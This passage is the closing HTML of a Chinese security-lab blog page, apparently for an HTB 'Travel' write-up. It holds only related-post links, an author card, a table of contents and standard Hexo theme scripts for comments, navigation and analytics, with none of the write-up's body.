fa-fw"></i> 2024-09-05</div><div class="title">打靶记录(一三三)之HTBCanape</div></div></a></div><div><a href="/2024/03/16/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E9%9B%B6%E5%85%AD)%E4%B9%8BTHMUnbakedPie/" title="打靶记录(一零六)之THMUnbakedPie"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-16</div><div class="title">打靶记录(一零六)之THMUnbakedPie</div></div></a></div><div><a href="/2024/03/15/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E9%9B%B6%E5%9B%9B)%E4%B9%8BTHMJaxSucksAlot/" title="打靶记录(一零四)之THMJaxSucksAlot"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-15</div><div class="title">打靶记录(一零四)之THMJaxSucksAlot</div></div></a></div><div><a href="/2024/02/15/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E5%85%AB%E4%B9%9D)%E4%B9%8BHMVPickle/" title="打靶记录(八九)之HMVPickle"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-15</div><div class="title">打靶记录(八九)之HMVPickle</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getshell"><span class="toc-number">3.</span> <span class="toc-text">Getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">5.</span> <span class="toc-text">碎碎念</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2024/09/12/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E4%B8%89)%E4%B9%8BHTBTravel/'
+    this.page.identifier = '/2024/09/12/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E4%B8%89)%E4%B9%8BHTBTravel/'
+    this.page.title = '打靶记录(一四三)之HTBTravel'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
